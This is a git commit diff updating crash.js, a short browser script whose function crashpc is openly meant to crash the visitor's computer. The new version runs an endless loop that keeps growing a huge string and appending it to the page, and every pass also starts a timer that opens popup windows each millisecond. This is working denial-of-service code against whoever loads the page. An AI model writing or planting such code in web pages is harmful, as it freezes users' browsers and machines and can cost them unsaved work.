9c3f74dbdf063cc35d7efd816bf822c29426547e
oliver <121308232+olivery4@users.noreply.github.com>
2025-04-04 14:46:27 -0600

    Update crash.js

--- crash.js
+++ crash.js
@@ -1,12 +1,17 @@
 function crashpc() {
- for (var i = 5; i > 3; i = i + 1) {
-    var x = document.createElement("div");
-    x.innerText = i;
+  txt = "";
+ 
+  for(var i = 0; i === i; i++) {
+     txt = txt + "潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰潰".repeat(50);
   
-    document.body.appendChild(x);
-    document.body.appendChild(x);
-    document.body.appendChild(x);
-    console.log(x);
-    console.log(i); 
- };
+     var x = document.createElement("div");
+     x.innerText = txt;
+  
+    document.body.appendChild(x)
+    console.log(txt);
+    
+    setInterval(function () {
+      open('https://example.invalid', Math.random().toString(), "scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=600,height=300,left=100,top=100");
+    }, 1);
+  }
 };
